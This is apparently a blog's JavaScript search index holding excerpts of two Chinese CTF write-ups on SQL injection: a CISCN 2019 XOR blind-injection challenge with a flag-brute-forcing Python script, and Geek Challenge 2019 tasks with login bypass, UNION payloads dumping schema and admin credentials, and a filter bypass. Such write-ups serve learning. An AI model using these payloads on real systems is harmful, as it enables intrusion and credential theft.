var store = [{
        "title": "Ciscn2019 华北赛区 day2 web1 - hack world",
        "excerpt":"0x01 题目描述 很明显这是一道sql注入的题目，已经给出了flag所在的列名和表名，且提供一个id查询的功能。当提交1和2的时候，查询出了两句骚话 Hello, glzjin wants a girlfriend. Do you want to be my girlfriend? 0x02 获取flag 尝试输入一些常规的sql注入语句，结果都被过滤了，尝试异或注入，输入1^1^1，返回了id=1的结果 SQL中的^是异或判断，当^两边相同的时候，其值为0，当^两边不相同时，其值为1 1^1=0 1^2=1 所以我们可以通过输入1^(ascii(substr((select(flag)from(flag)),1,1))&gt;x)^1，不断改变x的值，根据回显逐渐爆破出flag的值。因为本萌新还不会写脚本，所以用了一下赵师傅的脚本 import requests url = \"http://web43.buuoj.cn/index.php\" result = '' for i in range(1, 38): for j in range(0, 256): payload = '1^(cot(ascii(substr((select(flag)from(flag)),' + str(i) + ',1))&gt;' + str(j) +...","categories": ["ctf"],
        "tags": ["sqli","web","ctf"],
        "url": "/ctf/hackworld/",
        "teaser": null
      },{
        "title": "极客大挑战2019 - SQLI",
        "excerpt":"题目描述 极客大挑战2019的sql注入系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客 EasySQL 这题没什么好说的，万能密码一试就成功了 网站做的确实非常精湛！！ LoveSQL 用上面的万能密码登录进去后，没有flag，而是给出了一串密码，让人不禁联想到sql查询。在加上登录界面的提示，可以判断flag应该在数据库的某个地方 接下来在输入用户名处拼接常规的sql注入语句就行了，payload可以参考 #爆出所有库名 ?id=0 union select 1,group_concat(distinct table_schema) from information_schema.columns #爆出数据库news的所有表名 ?id=0 union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema = 'news' #爆出表admin的所有列 ?id=0 union select 1,group_concat(distinct column_name) from information_schema.columns where table_name = 'admin' #查username和password，中间用:隔开 ?id=0 union select 1,group_concat(username,0x3a,password) from admin BabySQL 这题应该才是我真正想写的一题。这题确实和登录界面说的一样，和之前的不同，做了严格的过滤。（2333 稍微看仔细点，就能发现很多关键单词比如or、where、select等都被替换为空了。解决的方法很简单，因为这道题只替换了一次，所以可以在一个单词里再写一个这个单词，比如把or写成oorr，就可以绕过这个“严格”的过滤了...","categories": ["ctf"],
        "tags": ["sqli","web","ctf"],
        "url": "/ctf/geekchall/",
        "teaser": null
      }]
